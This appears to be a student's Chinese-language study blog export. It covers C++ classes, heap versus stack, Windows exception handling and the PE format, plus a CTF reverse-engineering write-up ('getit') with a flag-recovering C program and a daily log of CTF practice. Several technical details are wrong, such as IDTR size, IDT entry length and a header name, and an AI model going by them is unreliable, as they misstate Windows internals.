<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:  <span class="comment">//私有的</span></span><br><span class="line">    <span class="keyword">char</span> *m_name;</span><br><span class="line">    <span class="keyword">float</span> m_score;</span><br><span class="line"><span class="keyword">public</span>:  <span class="comment">//共有的</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setname</span><span class="params">(<span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    m_name = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Student::setscore</span><span class="params">(<span class="keyword">float</span> score)</span></span>&#123;</span><br><span class="line">    m_score = score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//在栈上创建对象</span></span><br><span class="line">    Student stu;</span><br><span class="line">    stu.<span class="built_in">setname</span>(<span class="string">&quot;小明&quot;</span>);</span><br><span class="line">    stu.<span class="built_in">setscore</span>(<span class="number">92.5f</span>);</span><br><span class="line">    <span class="comment">//在堆上创建对象</span></span><br><span class="line">    Student *pstu = <span class="keyword">new</span> Student;</span><br><span class="line">    pstu -&gt; <span class="built_in">setname</span>(<span class="string">&quot;李华&quot;</span>);</span><br><span class="line">    pstu -&gt; <span class="built_in">setscore</span>(<span class="number">96</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的写法是错误的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">stu.m_name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">stu.m_score = <span class="number">92.5f</span>;</span><br><span class="line">stu.<span class="built_in">show</span>();</span><br></pre></td></tr></table></figure>
<p>因为私有的成员变量不能通过对象直接访问，必须借助public属性的成员函数来修改</p>
<h4 id="类的封装">类的封装</h4>
<p>private：作用在于更好的隐藏内部的实现，不希望外部知道或只在内部使用的成员声明为private<br>
public：向外部暴露的接口声明为public//如上面的setname()和setscore()<br>
（实际项目开发中，成员变量都建议声明为private，只将允许通过对象对用的成员函数声明为public）<br>
protected：在类外也不能通过对象访问，但在派生类内部可以访问</p>
<blockquote>
<p>给成员变量赋值的函数通常以set开头；读取成员变量的值的函数通常以get开头</p>
</blockquote>
<p>private 和 public的使用体现了类的封装性，即：尽量隐藏类的内部实现，只向用户提供有用的成员函数。</p>
<h3 id="构造函数">构造函数</h3>
<p>一种特殊的成员函数，名称与类名完全相同，可用于对某些成员变量设置初始值。创建对象时系统会自动调用构造函数进行初始化工作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Line::<span class="built_in">Line</span>( <span class="keyword">double</span> len，<span class="keyword">int</span> age, <span class="keyword">float</span> score): <span class="built_in">length</span>(len)<span class="comment">//构造函数，也可以对多个成员变量进行赋值</span></span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//相当于</span></span><br><span class="line">Line::<span class="built_in">Line</span>( <span class="keyword">double</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    length = len;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="初始化const成员变量">初始化const成员变量</h4>
<p>如：对下面m_len的初始化</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VLA</span>&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> m_len;</span><br><span class="line">    <span class="keyword">int</span> *m_arr;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">VLA</span>(<span class="keyword">int</span> len);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只能使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">VLA::<span class="built_in">VLA</span>(<span class="keyword">int</span> len):<span class="built_in">m_len</span>(len)&#123;</span><br><span class="line">    m_arr=<span class="keyword">new</span> <span class="keyword">int</span>[len]</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//而不能：</span></span><br><span class="line">VLA::<span class="built_in">VLA</span>(<span class="keyword">int</span> len)&#123;</span><br><span class="line">    m_len = len;</span><br><span class="line">    m_arr = <span class="keyword">new</span> <span class="keyword">int</span>[len];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>堆和栈的区别</h1>
<ol>
<li>内存分配<br>
堆由程序员分配和释放；栈由编译器自动分配</li>
<li>申请方式<br>
堆：用malloc、new申请；栈：如int a</li>
<li>大小限制<br>
堆：向高地址扩展，用不连续的内存空间存储。大小受到系统虚拟内存大小的限制，因此获得的空间比较大<br>
栈：向低地址扩展，一块连续的内存空间。栈的大小是固定的，能申请的空间比较小</li>
<li>效率<br>
堆：速度慢，容易产生内存碎片<br>
栈：系统分配，速度快</li>
</ol>
<h1>攻防世界逆向题</h1>
<h2 id="getit">getit</h2>
<p>首先放到ida里看伪代码<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSEUs.png" alt="tSSEUs.png"><br>
其中<br>
t存放的是“SharifCTF{???}”<br>
u存放的是“*******************************************”<br>
s存放的是“c61b68366edeb7bdce3c6820314b7498”<br>
并且s的长度和t里的?一样；“SharifCTF{”长度为10<br>
整段伪代码大概就是：<br>
先改变t里每个?的值，然后输出到文件，然后再改变整个t，再输出一次，最后把这个文件删了<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSAEj.png" alt="tSSAEj.png"><br>
在第一次输出时伪代码是：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">fprintf</span>(stream, <span class="string">&quot;%s\n&quot;</span>, u, v5);</span><br></pre></td></tr></table></figure>
<p>只有一个%s，看起来只输出了u，并没有输出v5</p>
<p>在第二次输出时用到了fseek(),其作用是将文件的指针移动：<br>
<img src="https://s1.ax1x.com/2020/05/24/tSSwrD.png" alt="tSSwrD.png"></p>
<p>由于u的内容一直都是&quot;<em>…</em>**<em>…</em>&quot;，那么也就是说存放flag的t被最后一个循环覆盖为了一堆 *<br>
综上，flag应该出现在第一次输出时的t里，得到flag的过程为程序的第一个循环，可以得到代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s[<span class="number">50</span>]=<span class="string">&quot;c61b68366edeb7bdce3c6820314b7498&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> v=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> v3;</span><br><span class="line">	<span class="keyword">char</span> t[<span class="number">50</span>]=<span class="string">&quot;SharifCTF&#123;????????????????????????????????&#125;&quot;</span>; </span><br><span class="line">	<span class="keyword">while</span>((<span class="keyword">signed</span> <span class="keyword">int</span> )v&lt;<span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">		<span class="keyword">if</span>(v&amp;<span class="number">1</span>)</span><br><span class="line">			v3=<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			v3=<span class="number">-1</span>;</span><br><span class="line">		*(t+(<span class="keyword">signed</span> <span class="keyword">int</span>)v+<span class="number">10</span>)=s[(<span class="keyword">signed</span> <span class="keyword">int</span>)v]+v3;</span><br><span class="line">		<span class="comment">//从&#123;后面开始修改数组t的内容 </span></span><br><span class="line">		v=v+<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(t);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.11-2020.05.17</title>
    <url>/32652.html</url>
    <content><![CDATA[<h1>Windows下的异常处理</h1>
<p>操作系统处理程序错误或异常的一系列流程和技术的总称。主要有两种异常处理技术，SEH（结构化异常处理）和VEH（向量化异常处理）</p>
<h2 id="基本概念">基本概念</h2>
<p>中断是由外部硬件设备或异步事件产生的，异常是由内部事件产生的，可分为故障、陷阱、终止 3类。前两个是可恢复的，第三个是不可恢复的，系统必须重启</p>
<h3 id="异常列表">异常列表</h3>
<p><img src="https://s1.ax1x.com/2020/05/18/YfskvR.png" alt="YfskvR.png"><br>
由cpu引发的称为硬件异常，如访问一个无效的地址；由操作系统或程序引发的称为软件异常<br>
代码中可以用RaiseException()主动引发一个软件异常</p>
<span id="more"></span>  
<h3 id="异常处理的基本过程">异常处理的基本过程</h3>
<p>中断或异常发生时，cpu会通过中断描述符表（IDT）寻找处理函数。IDT是硬件和软件交接中断和异常的关口</p>
<h4 id="IDT">IDT</h4>
<p>IDT是一张位于物理内存中的线性表，共有256项，32位下每个项的长度是8字节，64位下每个项的长度是64字节。<br>
IDT的位置和长度是由cpu的IDTR寄存器描述的，IDTR共有84位，高32位为基址，低16位是表度长度。可以使用SIDT和LIDT指令读写该寄存器，LIDT只能在ring0下运行<br>
IDT的每一项都是一个门结构，包括：</p>
<ol>
<li>任务门描述符，用于cpu的任务切换</li>
<li>中断门，用于描述中断处理程序的入口</li>
<li>陷阱门，用于描述异常处理程序的入口</li>
</ol>
<p>用windbg的本地内核调试模式可以观察IDT</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lkd&gt; !idt /a</span><br></pre></td></tr></table></figure>
<h4 id="异常处理的准备工作">异常处理的准备工作</h4>
<p><img src="https://s1.ax1x.com/2020/05/18/YfsVDx.png" alt="YfsVDx.png"><br>
当由异常或者中断发生时，cpu会根据中断类型号执行对应的中断处理程序。<br>
各个异常处理函数除了针对本异常的特定处理之外，通常会将异常信息进行封装。<br>
封装的内容中，一部分是异常记录，包含本次异常的信息，包括异常代码（异常产生的原因）、异常标志、异常发生的地址等；另一部分是陷阱帧，它精确的描述了发生异常时的线程状态，该结构与处理器有关，在不同平台上结构不同。<br>
封装后，异常处理函数会调用nt!KiDispatchException函数处理异常，</p>
<h4 id="内核态的异常处理过程">内核态的异常处理过程</h4>
<p>即当PreviousMode为KernelMode时。此时KiDispatchException会进行以下分发异常</p>
<ol>
<li>检测系统是否正在被内核调试器调试。如果内核调试器存在，系统就把异常处理的控制权转交给内核调试器。内核调试器取得控制权后会根据用户对异常处理的设置来确定是否要处理异常。如果处理了，那么异常的线程就会回到原来的位置继续执行；如果无法确定是否处理，就发生中断，由用户决定处理</li>
<li>如果不存在内核调试器，或者1中不处理该异常，系统将调用nt!RtlDispatchException,根据线程注册的结构化异常处理过程来处理</li>
<li>如果2时没有处理异常，系统会让内核调试器再次取得对异常的处理权</li>
<li>如果不存在内核调试器或3中调试器仍不处理，系统就认为不能继续运行了，会直接KeBugCheckEX,产生蓝屏错误<br>
在上述异常处理过程中，只有在某一步中异常没有处理才会进行下一个过程，只要异常被处理了，就会终止整个异常处理过程</li>
</ol>
<h4 id="用户态异常处理过程">用户态异常处理过程</h4>
<p>即当PreviousMode为UserMode时。此时KiDispatchException依然会检测内核调试器是否存在，如果存在就会优先把控制权交给内核调试器。多数情况下，内核调试器不处理用户态的异常，nt!KiDispatchException就会进行如下过程：</p>
<ol>
<li>如果发生异常的程序正在被调试，那么将异常信息发送给正在调试的用户态调试器；如果没有被调试就跳过这个步骤</li>
<li>如果没有被调试或调试器未处理异常，那么在栈上放置EXCEPTION_RECORD和CONTEXT两个结构，并将控制权返回用户态ntdll.dll中的KiUserExceptionDispatche函数，由它调用其它函数进行用户态的异常处理，这一部分涉及SEH和VEH两种处理机制。如果没有调试器能附加或调试器处理不了异常，系统就调用ExitProcess函数结束程序</li>
<li>如果2未能处理该异常，那么会再次回到nt!KiDispatchException,再次把异常信息发送给用户态的调试器，如果没有调试器则直接结束进程</li>
<li>如果3中调试器仍不处理，则nt!KiDispatchException再次把异常分发给进程的异常端口进行处理。该端口通常由子系统进程csrss.exe进行监听。子系统监听后会显示一个“应用程序错误”对话框。可以单击按钮，将其附加到调试器。如果没有调试器或者处理不了，则程序被终结</li>
<li>在终结程序之前，系统会再次调用发生异常的线程中的所有异常处理过程，这是线程异常处理过程中清理未释放资源的机会</li>
</ol>
<h1>C++</h1>
<p>按照http://c.biancheng.net/cplus/ 的顺序</p>
<h2 id="类和对象">类和对象</h2>
<p>在之前的周报中有记过<a href="https://brubbish.github.io/20849.html#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%EF%BC%88OOP%EF%BC%89%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%90%8D%E8%AF%8D">2020.03.30-2020.04.05</a>，现在忘了一些，再看一看，加深印象。<br>
 <br>
类可以看作 c 语言中结构体的升级版。<br>
类的成员不但可以是变量，还可以是函数,通过类定义出的变量叫做对象<br>
（也将类的成员变量称为属性，类的成员函数称为方法）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">float</span> score;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s的年龄是 %d，成绩是 %f\n&quot;</span>, name, age, score);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span> <span class="title">stu1</span>;</span></span><br><span class="line">stu1.name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">stu1.age = <span class="number">15</span>;</span><br><span class="line">stu1.score = <span class="number">92.5f</span>;</span><br><span class="line">stu1.<span class="built_in">say</span>();</span><br></pre></td></tr></table></figure>
<p>先用<strong>关键字</strong>class定义了一个<strong>类</strong>student，用这个类创建了一个<strong>对象</strong>stu1，后面这个过程叫做<strong>类的实例化</strong>，所以也称对象是类的一个<strong>实例</strong></p>
<p>在面向对象编程中，类由一组相关联的函数和变量组成，可以将一个或多个类放在一个源文件中，在使用时引入对应的类，调用需要的函数。</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.05.25-2020.05.24</title>
    <url>/33336.html</url>
    <content><![CDATA[<h1>PE文件格式</h1>
<p>可执行文件的格式是操作系统本身执行机制的反映。<br>
PE（Portable Executable File Format 可移植的执行体)<br>
头文件winnt.h中的image format给出了pe文件的内容，可以找到所有pe文件的数据结构定义、枚举类型、常量定义等<br>
exe和dll文件使用完全相同的pe格式，唯一的区别就是用一个字段标识出这个文件是exe还是dll<br>
64位Windows只是对pe格式进行了一些简单的修饰，新的格式为pe32+，没有新的结构加入，只是把32位字段扩展成64位<br>
<img src="https://s1.ax1x.com/2020/05/25/tCceGn.png" alt="tCceGn.png"></p>
<span id="more"></span>
<h2 id="PE的基本概念">PE的基本概念</h2>
<p>pe文件的内容分为不同区块，区块中包含代码或数据，各个区块按页边界对齐。区块大小没有限制，是一个连续的结构。每个块在内存中都有自己的属性如是否包含代码、是否可读写等<br>
pe文件不是作为单一内存映射文件被载入内存。pe装载器遍历pe文件并决定文件的哪部分被映射。磁盘文件一旦被载入内存，磁盘上的数据结构布局和内存中的数据结构布局就是一致的，但数据之间的的相对位置可能会改变</p>
<h3 id="基地址">基地址</h3>
<p>PE文件通过加载器载入内存后，内存中的版本称为模块。映射文件的起始地址（基地址）称为模块句柄，可以通过模块句柄访问内存中的其他数据结构。<br>
<img src="https://s1.ax1x.com/2020/05/25/tCcm2q.png" alt="tCcm2q.png"><br>
内存中的模块代表进程将这个可执行文件所需要的代码、数据、输入表、输出表及其他有用的数据结构所使用的内存都放在一个连续的内存块中。PE文件的剩余部分可以被读入，但可能无法被映射。例如在将调试信息放到文件尾部时，PE的一个字段会告诉系统不能映射的数据将被放置在文件的尾部。在32位Windows种可以直接调用GetModuleHandle取得指向dll的指针，通过该指针访问DLL Mdodle。<br>
基地址的值是由pe文件本身设定的</p>
<h2 id="虚拟地址（Virtual-Address）">虚拟地址（Virtual Address）</h2>
<h3 id="相对虚拟地址（RVA）">相对虚拟地址（RVA）</h3>
<p>相对于pe文件载入地址的偏移位置，其实就是一个偏移量。<br>
假设一个文件从400000h处载入，代码区块开始于401000h处，代码区块的RVA计算方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标地址401000-载入地址400000h=RVA1000h</span><br></pre></td></tr></table></figure>
<p>同样，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">虚拟地址VA=基地址ImageBase+相对虚拟地址RVA</span><br></pre></td></tr></table></figure>
<h3 id="文件偏移地址（物理地址）">文件偏移地址（物理地址）</h3>
<p>pe文件的某个数据位置相对于文件头的偏移量<br>
用十六进制工具打开文件时显示的地址就是文件偏移地址</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
        <tag>CTF</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.07.06-2020.07.12</title>
    <url>/36664.html</url>
    <content><![CDATA[<h2 id="MS-DOS头部">MS-DOS头部</h2>
<p>每一个pe文件都以一个dos程序开始。程序在dos下执行，dos就能识别出这是一个有效的执行体，然后运行MZ header的DOS stub（dos块）。DOS stub是一个有效的exe，大多数情况下由编译器或汇编器自动生成。通常把DOS MZ头和DOS stub合称为DOS文件头。<br>
PE文件的第一个字节位于MS-DOS头部，称作IMAGE_DOS_HEADER，其中有两个字段：e_magic和e_lfanew。</p>
<span id="more"></span>
<ul>
<li>
<p>e_magic的值被设为5A4Dh,ASCII值为MZ</p>
</li>
<li>
<p>e_lfanew指出真正的PE文件头的相对偏移位置，占4字节，在文件开始偏移3Ch字节处。</p>
</li>
</ul>
<h2 id="PE文件头部">PE文件头部</h2>
<p>紧接着DOS stub的是PE文件头。PE文件头是PE相关结构NT映像头的简称，其中包含许多PE装载器能用到的重要字段。当执行体在支持PE文件结构的操作系统中执行是，PE装载器将从IMAGE_DOS_HADER结构的e_lfanew字段中找到PE文件头的起始偏移量，加上基址就得到PE文件头的指针。<br>
IMAGE_DOS_HEADER有两个版本，一个是为32位（PE32）可执行文件准备的,另一个是64位（PE32+）的，两个几乎没有区别。<br>
IMAGE_DOS_HEADER中有3个字段：</p>
<h3 id="Signature字段">Signature字段</h3>
<p>在一个有效的PE文件里，Signature字段被设置为0x00004550，对应ASCII字符为PE00<br>
MS-DOS头部的e_lfanew正是指向这个字段</p>
<h3 id="FileHeader字段">FileHeader字段</h3>
<p>IMAGE_FILE_HEADER（映像头文件）结构包含PE文件的一些基本信息和这个结构的大小。<br>
结构的各个字段包括：</p>
<ol>
<li>
<p>Machine：可执行文件的目标cpu类型</p>
</li>
<li>
<p>NumberOfSection：区块的数目</p>
</li>
<li>
<p>TimeDateStamp：文件创建时间</p>
</li>
<li>
<p>PointerToSymbolTable：COFF符号表的文件偏移位置</p>
</li>
<li>
<p>NumberOfSymbols：如果有COFF符号表，它代表其中的符号数目，可以用来找到COFF符号表的结束处</p>
</li>
<li>
<p>SizeOfOptionalHeader：表示数据的大小，依赖于文件是32位还是64位</p>
</li>
<li>
<p>Characteristics：文件属性，定义域winnt.h内的IMAGE_FILE_xxx值</p>
</li>
</ol>
<h3 id="OptionalHeader字段">OptionalHeader字段</h3>
<p>定义PE文件的其他属性</p>
<h2 id="区块">区块</h2>
<p><img src="https://s1.ax1x.com/2020/07/10/UMsx29.png" alt="UMsx29.png"><br>
<img src="https://s1.ax1x.com/2020/07/10/UMszvR.png" alt="UMszvR.png"></p>
<h3 id="区块表">区块表</h3>
<p>区块表是一个IMAGE_SECTION_HEADER结构数组，每个区块表结构包含了它所关联的区块的信息，例如位置、长度等，数组的数目由IMAGE_NT_HEADERS.FileHeader.NumberOfSection指出。</p>
<h3 id="常见区块与区块合并">常见区块与区块合并</h3>
<p>链接器能够合并区块，优点是节省空间。每个区块至少占用一个内存页，将两个区块合并就有可能少用一个内存页。<br>
部分在载入内存时由Windows加载器写入的输入数据可能会被放入只读区块，因为在加载时，系统会临时修改那些包含输入数据的页属性为可读可写，初始化完成后恢复为原来的属性</p>
<h3 id="区块对齐值">区块对齐值</h3>
<p>区块有两种对齐值，一种用于磁盘文件内，一种用于内存，两者可以不同。<br>
PE文件头里的FileAlignment定义了<em>磁盘区块</em>的对齐值。在不足的地方（区块间隙）用00h填充<br>
PE文件头里的SectionAlignment定义了<em>内存区块</em>的对齐值。当PE文件被映射到内存中时，区块总是至少从一个页边界处开始，即每个区块的第一个字节对应于某个内存页。<br>
建立一个区块在文件中的偏移和内存中的偏移相同的PE文件，可以提高载入速度并使文件变大</p>
<h3 id="文件偏移与虚拟地址的转换">文件偏移与虚拟地址的转换</h3>
<p>对于磁盘对齐值和内存页不同的区块，同一数据在磁盘文件中的偏移和在内存中的偏移不同，需要进行转换。<br>
<img src="https://s1.ax1x.com/2020/07/15/U010qs.png" alt="U010qs.png"><br>
文件被映射到内存中时，MS-DOS头部、PE文件头和块表的偏移位置和大小没有变化，而各区块被映射到内存后偏移位置发生变化</p>
<h2 id="输入表">输入表</h2>
<p>可执行文件使用来自其他DLL的代码或数据的动作称为输入。当PE文件被载入时，加载器的工作之一就是定位所有被输入的函数和数据，并让文件可以使用那些地址。这个过程通过PE文件的输入表Import Table完成。输入表中保存的是函数名和其驻留的DLL名等动态链接所需的信息。</p>
<h3 id="输入函数的调用">输入函数的调用</h3>
<p>输入函数被程序调用，但执行代码不在程序中。这些函数的代码位于相关的DLL文件中，在程序中只保留函数信息如函数名、DLL文件名等。磁盘上的PE文件无法得知这些输入函数在内存中的地址，只有当载入内存后，加载器才将相关DLL载入，并将函数地址和调用的指令联系起来</p>
]]></content>
      <tags>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>大一暑假日常</title>
    <url>/31605.html</url>
    <content><![CDATA[<h2 id="8-8">8-8</h2>
<p>上周在做moectf，被新生赛弄自闭了（</p>
<p>加密与解密</p>
<h2 id="8-1">8-1</h2>
<p>7-31没学所以没写…<br>
写了七题moectf，两题re，三题web，一题pwn，一题经典密码<br>
pwn写的感觉自己很瓜，有个叫backdoor的函数名硬是看了半个小时没看到…</p>
<span id="more"></span>
<h2 id="7-29、7-30">7-29、7-30</h2>
<p>7-29：早上看了点数据结构-树，下午坐动车，在车上看了《程》第六章前三节（然后就睡着了…，晚上啥也没干，日报也没写:)<br>
7-30：写了一题pwn，两题re</p>
<p><a href="/2827.html">材料</a></p>
<h2 id="7-28">7-28</h2>
<p>昨天晚上以为把昨天的上传掉了，结果早上彦林哥问起来的时候发现并没有弄上…下午发现因为昨天那篇用了大括号，hexo g的时候报错了（然后没有注意到就hexo d了）<br>
大括号嵌套使用的时候要加上：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% raw %&#125;内容&#123;% endraw %&#125;</span><br></pre></td></tr></table></figure>
<p>好像其他括号啥的直接嵌套着用也会报错，不过还没有遇到</p>
<ol>
<li>数据结构看了串和树的开头</li>
<li>写了一题pwnable.kr上的题</li>
</ol>
<p>本来想写个攻防世界上的”guess_num“，结果场景加载不出来</p>
<p><a href="/53130.html">材料</a></p>
<h2 id="7-27">7-27</h2>
<p>看了点数据结构，本来想写一题pwn题，结果pwntools突然用不了（可能是之前删了一些文件），安装pwndbg也不知道有没有弄上…就没写了<br>
早上kali网络连不上，虚拟机上弄了半个小时没好，物理机的网络重新连接一下又好了…<br>
打算这几天写掉这两题</p>
<ol>
<li><span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1NyZwYWdlPTE=">guess_num<i class="fa fa-external-link-alt"></i></span></li>
<li>passcode:ssh <span class="exturl" data-url="bWFpbHRvOnBhc3Njb2RlQHB3bmFibGUua3I=">passcode@pwnable.kr<i class="fa fa-external-link-alt"></i></span> -p2222 (pw:guest)</li>
</ol>
<p><a href="/52170.html">材料(笔记)</a></p>
<h2 id="7-24">7-24</h2>
<ol>
<li>一题pwn。有思路，但是有个地方不知道怎么实现，看了别人的exp知道怎么写了，不过有些地方还不是很懂</li>
<li>《逆向工程核心原理》第四章</li>
</ol>
<p><a href="/51850.html">材料</a></p>
<h2 id="7-23">7-23</h2>
<ol>
<li>写了一题攻防世界的pwn题:<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1MSZwYWdlPTE=">when_did_you_born<i class="fa fa-external-link-alt"></i></span>，看了一题<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1NyZwYWdlPTE=">guess_num<i class="fa fa-external-link-alt"></i></span>，还没写出来（应该是不会了…）</li>
<li>看了点数据结构的堆栈  部分</li>
</ol>
<p>写题花了比较久，差不多是看了三题发现一题会写，一题思路错了，一题根本没思路…<br>
<a href="/64573.html">材料</a></p>
<h2 id="7-22">7-22</h2>
<p>今天有半天在动车上…</p>
<ol>
<li>攻防世界上写了一题pwn：<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cHduJm51bWJlcj0yJmdyYWRlPTAmaWQ9NTA1MyZwYWdlPTE=">level0<i class="fa fa-external-link-alt"></i></span></li>
<li>《程》第四章第一节到第四节</li>
</ol>
<p>打算以后十一点半后不看手机电脑了:(<br>
好像也没啥材料写…</p>
<h2 id="7-21">7-21</h2>
<p>昨天（周一）把《程》第三章看完，感觉没啥好写的（其实是晚上十一点才想起来就懒得写了…）</p>
<ol>
<li>发现上回把pwntools装上了（之前以为没装成），就在pwnable.kr上写了两题，攻防世界写了一题pwn。emmm看的题比写的多一点</li>
<li>看了《逆向工程核心原理》的第二章。分析了“hello world”程序，讲了两种修改输出字符串的方法。没啥想法。</li>
</ol>
<p>感觉最近越来越懒了…一直看电脑导致眼睛也有点不舒服…<br>
不想看PDF，想买书了orz<br>
<a href="/14532.html">今天的材料</a></p>
<h2 id="7-17">7-17</h2>
<ol>
<li>把数据结构数组的部分跳过了，看了一些堆栈的</li>
<li>写了个<span class="exturl" data-url="aHR0cHM6Ly9hZHdvcmxkLnhjdGYub3JnLmNuL3Rhc2svYW5zd2VyP3R5cGU9cmV2ZXJzZSZudW1iZXI9NCZncmFkZT0wJmlkPTUwODEmcGFnZT0x">攻防世界上的re题<i class="fa fa-external-link-alt"></i></span> (以及九道非常入门的web题…)</li>
</ol>
<p><a href="/12344.html">今天的材料</a></p>
<h2 id="7-16">7-16</h2>
<ol>
<li>看了点数组（对称矩阵的压缩存储）。感觉各种存储结构好复杂…明天再查点资料</li>
<li>把昨天那题剩下的部分看完了</li>
</ol>
<p><a href="/13445.html">今天的材料</a></p>
<h2 id="7-15">7-15</h2>
<ol>
<li>《程》第三章第三节</li>
<li>数据结构线性表的两个应用举例。一个是链式存储一元多项式的和，这个之前在mooc上看过，没啥感觉；另一个打印文本文件最后n行，链表的部分懂了，argc、*argv[]和通过命令行输入参数不是很懂…</li>
<li>把彦林学长上回给的一题逆向题再看了一点，就汇编代码对照着伪代码理解了一下</li>
</ol>
<p><a href="/64075.html">这个是有关材料</a></p>
<h2 id="7-14">7-14</h2>
<p>今天跟昨天差不多，早上有点事，下午去驾校，（晚上打lol），学的很少…</p>
<ol>
<li>《程》第三章，（本来以为能把这章看完，但事实上并没有…）就看了前两节。跟《加密与解密》十一章（PE）有点关系，就多了个ELF文件，感觉这个讲的更细一些，也对之前看的加密与解密更理解了（大概吧）</li>
<li>双向循环链表和非循环链表。把指针设为llink和rlink，其它好像不是特别难（…）。这章还剩下应用举例没看，感觉好像有点复杂Orz</li>
</ol>
<h2 id="7-13">7-13</h2>
<p>（今天好像没干啥，早上有点事，下午去驾校挂科二时长的时候才开始看点书）</p>
<ol>
<li>看了点线性链表，感觉基本跟上学期学的没啥差别，就再多了逆转、合并、排序，感觉挺巧妙的但不难</li>
<li>《程序员的自我修养》看完了第二章，上周第一章“回顾大家所了解的”看得瑟瑟发抖。这章了解了一些预处理、编译、汇编和链接的大致过程，还有静态语言、动态语言、静态链接、动态链接的区别。emmm写编译器真是太难了…</li>
</ol>
]]></content>
      <tags>
        <tag>日报</tag>
      </tags>
  </entry>
  <entry>
    <title>部分pwn题wp</title>
    <url>/26411.html</url>
    <content><![CDATA[<p>主要是大二上刚开学做的题</p>
